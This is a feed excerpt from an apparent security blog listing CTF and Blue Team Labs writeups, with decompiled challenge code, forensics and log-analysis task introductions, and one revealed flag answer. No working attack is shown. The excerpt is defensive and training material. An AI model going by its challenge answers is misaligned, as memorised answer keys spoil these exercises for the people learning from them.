&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 main_fn()
{
 __int64 idx; // r15
 int v1; // ebp
 __int64 v2; // rbx
 unsigned __int64 v3; // r14
 int v4; // r9d
 int v5; // r9d
 char v6; // al
 __int64 v7; // rdx
 unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF
 char v10[32]; // [rsp+10h] [rbp-98h] BYREF
 __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF
 __int64 v12; // [rsp+50h] [rbp-58h]
 char v13; // [rsp+58h] [rbp-50h]
 unsigned __int64 v14; // [rsp+68h] [rbp-40h]

 idx = 10000000000000000LL;
 v1 = 0;
 v14 = __readfsqword(0x28u);
 v2 = sub_40C2B0(&amp;#34;/dev/urandom&amp;#34;, &amp;amp;unk_498004);
 do
 {
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v3 = v9 % 100000000uLL;
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) &amp;gt; 9999999999999999LL) - 1;
 --idx;
 }
 while ( idx );
 sub_44A050(v10, 1u, 30LL, &amp;#34;%lu&amp;#34;, 4 * v1 - 0x4F430000, v4);
 v13 = 0;
 v6 = 0x73;
 v12 = 0LL;
 memset(user_input, 0, sizeof(user_input));
 while ( 1 )
 {
 v7 = idx &amp;amp; 0xF;
 *(user_input + idx++) = v10[v7] ^ v6;
 if ( idx == 40 )
 break;
 v6 = byte_498040[idx];
 }
 if ( LOBYTE(user_input[0]) == &amp;#39;B&amp;#39; &amp;amp;&amp;amp; *(user_input + 1) == &amp;#39;NSLA&amp;#39; &amp;amp;&amp;amp; BYTE5(user_input[0]) == &amp;#39;{&amp;#39; &amp;amp;&amp;amp; HIBYTE(v12) == &amp;#39;}&amp;#39; )
 sub_44A130(1, &amp;#34;Lucky! flag is %s\n&amp;#34;, user_input, byte_498040, user_input, v5);
 else
 (sub_40C4B0)(&amp;#34;Not so lucky ...&amp;#34;, 1LL, v7, byte_498040, user_input);
 if ( v14 != __readfsqword(0x28u) )
 (sub_44A220)();
 return 0LL;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>BTLO - Bruteforce</title><link>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---bruteforce/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---bruteforce/</guid><description>&lt;h1 id="btlo---bruteforce">
 BTLO - Bruteforce
 &lt;a class="anchor" href="#btlo---bruteforce">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/bruteforce-16629bf9a2">https://blueteamlabs.online/home/challenge/bruteforce-16629bf9a2&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Can you analyze logs from an attempted RDP bruteforce attack?&lt;/p>
&lt;p>One of our system administrators identified a large number of Audit Failure events in the Windows Security Event log.&lt;/p>
&lt;p>There are a number of different ways to approach the analysis of these logs! Consider the suggested tools, but there are many others out there!&lt;/p>&lt;/blockquote>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many Audit Failure events are there? (Format: Count of Events)&lt;/p></description></item><item><title>BTLO - Follina</title><link>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---follina/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---follina/</guid><description>&lt;h1 id="btlo---follina">
 BTLO - Follina
 &lt;a class="anchor" href="#btlo---follina">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/follina-f1a3452f34">https://blueteamlabs.online/home/challenge/follina-f1a3452f34&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::
:::danger
因為給予的題目是真實的樣本，所以盡量在乾淨的環境或是reliable的sandbox進行測試
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team.&lt;/p>&lt;/blockquote>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;p>VirusTotal
Any.Run
OSINT&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the SHA1 hash value of the sample? (Format: SHA1Hash)&lt;/p></description></item><item><title>BTLO - Log Analysis -Compromised WordPress</title><link>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/</guid><description>&lt;h1 id="btlo---log-analysis--compromised-wordpress">
 BTLO - Log Analysis -Compromised WordPress
 &lt;a class="anchor" href="#btlo---log-analysis--compromised-wordpress">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/log-analysis-compromised-wordpress-ce000f5b59">https://blueteamlabs.online/home/challenge/log-analysis-compromised-wordpress-ce000f5b59&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>One of our WordPress sites has been compromised but we&amp;rsquo;re currently unsure how. The primary hypothesis is that an installed plugin was vulnerable to a remote code execution vulnerability which gave an attacker access to the underlying operating system of the server.&lt;/p>&lt;/blockquote>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;p>Grep
Sort
Uniq
Apache Log Analyzer&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Identify the URI of the admin login panel that the attacker gained access to (include the token)&lt;/p></description></item><item><title>BTLO - Meta</title><link>https://bernie6401.github.io/docs/security/practice/btlo/digital-forensic/btlo---meta/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/digital-forensic/btlo---meta/</guid><description>&lt;h1 id="btlo---meta">
 BTLO - Meta
 &lt;a class="anchor" href="#btlo---meta">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/meta-b976cec9e2">https://blueteamlabs.online/home/challenge/meta-b976cec9e2&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>The attached images were posted by a criminal on the run, with the caption &amp;ldquo;I&amp;rsquo;m roaming free. You will never catch me&amp;rdquo;. We believe you can assist us in proving him wrong.&lt;/p>&lt;/blockquote>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the camera model?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>問有關圖片相關的forensics直覺就是利用exiftool幫忙parse其中的內容，之後再慢慢extract出有用的資訊，&lt;del>或是直接丟到chatgpt幫忙extract問題的答案&lt;/del>&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install exiftool -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ exiftool uploaded_1.JPG &amp;gt; uploaded1_exiftool.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ exiftool uploaded_2.png &amp;gt; uploaded2_exiftool.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://chat.openai.com/share/6b38b409-1dec-4245-bb14-6a6fe98160af">chatgpt紀錄&lt;/a>&lt;/p></description></item><item><title>BTLO - Paranoid</title><link>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---paranoid/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---paranoid/</guid><description>&lt;h1 id="btlo---paranoid">
 BTLO - Paranoid
 &lt;a class="anchor" href="#btlo---paranoid">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/paranoid-e5e164befb">https://blueteamlabs.online/home/challenge/paranoid-e5e164befb&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
此lab大部分是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方
:::&lt;/p>
&lt;h2 id="tool">
 Tool
 &lt;a class="anchor" href="#tool">#&lt;/a>
&lt;/h2>
&lt;p>AUReport: &lt;code>$ sudo apt install auditd&lt;/code>
Linux CLI&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>aureport --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>usage: aureport &lt;span style="color:#f92672">[&lt;/span>options&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -a,--avc Avc report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -au,--auth Authentication report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --comm Commands run report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -c,--config Config change report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -cr,--crypto Crypto report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --debug Write malformed events that are skipped to stderr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --eoe-timeout secs End of Event Timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -e,--event Event report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --escape option Escape output
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -f,--file File name report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --failed only failed events in report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -h,--host Remote Host name report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --help help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -i,--interpret Interpretive mode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -if,--input &amp;lt;Input File name&amp;gt; use this file as input
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --input-logs Use the logs even &lt;span style="color:#66d9ef">if&lt;/span> stdin is a pipe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --integrity Integrity event report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -k,--key Key report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -l,--login Login report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -m,--mods Modification to accounts report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -ma,--mac Mandatory Access Control &lt;span style="color:#f92672">(&lt;/span>MAC&lt;span style="color:#f92672">)&lt;/span> report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -n,--anomaly aNomaly report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -nc,--no-config Don&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>t include config events
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --node &amp;lt;node name&amp;gt; Only events from a specific node
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -p,--pid Pid report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -r,--response Response to anomaly report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -s,--syscall Syscall report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --success only success events in report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --summary sorted totals &lt;span style="color:#66d9ef">for&lt;/span> main object in report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -t,--log Log time range report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -te,--end &lt;span style="color:#f92672">[&lt;/span>end date&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>end time&lt;span style="color:#f92672">]&lt;/span> ending date &amp;amp; time &lt;span style="color:#66d9ef">for&lt;/span> reports
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -tm,--terminal TerMinal name report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -ts,--start &lt;span style="color:#f92672">[&lt;/span>start date&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>start time&lt;span style="color:#f92672">]&lt;/span> starting data &amp;amp; time &lt;span style="color:#66d9ef">for&lt;/span> reports
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --tty Report about tty keystrokes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -u,--user User name report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -v,--version Version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --virt Virtualization report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -x,--executable eXecutable name report
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> If no report is given, the summary report will be displayed
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://hackmd.io/_uploads/B17xQgJOa.png" alt="圖片" />&lt;/p></description></item><item><title>BTLO - Phishing Analysis</title><link>https://bernie6401.github.io/docs/security/practice/btlo/security-operation/btlo---phishing-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/security-operation/btlo---phishing-analysis/</guid><description>&lt;h1 id="btlo---phishing-analysis">
 BTLO - Phishing Analysis
 &lt;a class="anchor" href="#btlo---phishing-analysis">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/phishing-analysis-f92ef500ce">https://blueteamlabs.online/home/challenge/phishing-analysis-f92ef500ce&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>A user has received a phishing email and forwarded it to the SOC. Can you investigate the email and attachment to collect useful artifacts?&lt;/p>&lt;/blockquote>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;p>Text Editor
Mozilla Thunderbird
URL2PNG
WHOis&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Who is the primary recipient of this email?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>這一題可以直接用&lt;a href="https://products.groupdocs.app/zh-hant/viewer/eml">線上工具 - EML Viewer&lt;/a>把eml file轉成pdf，不過風險就是有很多的資訊會流失掉，所以比較好的方式就是直接裝Mozilla Thunderbird查看
&lt;img src="https://hackmd.io/_uploads/Bk2fj8ldT.png" alt="圖片" />&lt;/p></description></item><item><title>BTLO - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/incident-response/btlo---secrets/</guid><description>&lt;h1 id="btlo---secrets">
 BTLO - Secrets
 &lt;a class="anchor" href="#btlo---secrets">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/secrets-85aa2bb3a9">https://blueteamlabs.online/home/challenge/secrets-85aa2bb3a9&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>You’re a senior cyber security engineer and during your shift, we have intercepted/noticed a high privilege actions from unknown source that could be identified as malicious. We have got you the ticket that made these actions.
You are the one who created the secret for these tickets. Please fix this and submit the low privilege ticket so we can make sure that you deserve this position.
Here is the ticket:&lt;/p></description></item><item><title>BTLO - Shiba Insider</title><link>https://bernie6401.github.io/docs/security/practice/btlo/digital-forensic/btlo---shiba-insider/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/btlo/digital-forensic/btlo---shiba-insider/</guid><description>&lt;h1 id="btlo---shiba-insider">
 BTLO - Shiba Insider
 &lt;a class="anchor" href="#btlo---shiba-insider">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://blueteamlabs.online/home/challenge/shiba-insider-5b48123711">https://blueteamlabs.online/home/challenge/shiba-insider-5b48123711&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;p>Wireshark
CyberChef
Steghide
Command Line
Exiftool&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the response message obtained from the PCAP file?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>這一題首先看到一個pcap file，以及zip file，不過zip file需要密碼才能unzip，所以先看pcap file有沒有相關訊息&lt;/p>
&lt;p>這個流量紀錄非常簡單，就是一個簡單的tcp connection，包含前面的三向交握以及get packet，交換完訊息之後當然就是要finish conversation，所以重點在中間他們交換的訊息
&lt;img src="https://hackmd.io/_uploads/S1rZCIpPT.png" alt="圖片" />&lt;/p>
&lt;p>傳回來的訊息說: &lt;code>use your own password&lt;/code>，其實也就是該題的答案&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>use your own password&lt;/code>
:::&lt;/p>
&lt;h2 id="q2">
 ==Q2==
 &lt;a class="anchor" href="#q2">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the password of the ZIP file?&lt;/p></description></item><item><title>CGGC 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="cggc-2023-初賽">
 CGGC 2023 初賽
 &lt;a class="anchor" href="#cggc-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>隊名: 王凡補習班&lt;/li>
&lt;li>名次
&lt;img src="https://hackmd.io/_uploads/ryb_H_FrT.png" alt="圖片" />
這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的&lt;/li>
&lt;/ul>
&lt;h2 id="gaoyi">
 GaoYi
 &lt;a class="anchor" href="#gaoyi">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setvbuf(stdout, &lt;span style="color:#ae81ff">0LL&lt;/span>, &lt;span style="color:#ae81ff">2LL&lt;/span>, &lt;span style="color:#ae81ff">0LL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(TITLE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to the Charitable Lag Vegas!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Anyone can participate with three million US dollars.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Input example: &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">C8&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Card %c: &amp;#34;&lt;/span>, i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">49&lt;/span>, v3, v4, v5, v6, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i], &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i]) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> j]) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">224&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> v8 &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">32&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v10 &lt;span style="color:#f92672">+&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> v12 &lt;span style="color:#f92672">+&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">33&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> v14 &lt;span style="color:#f92672">+&lt;/span> v13;
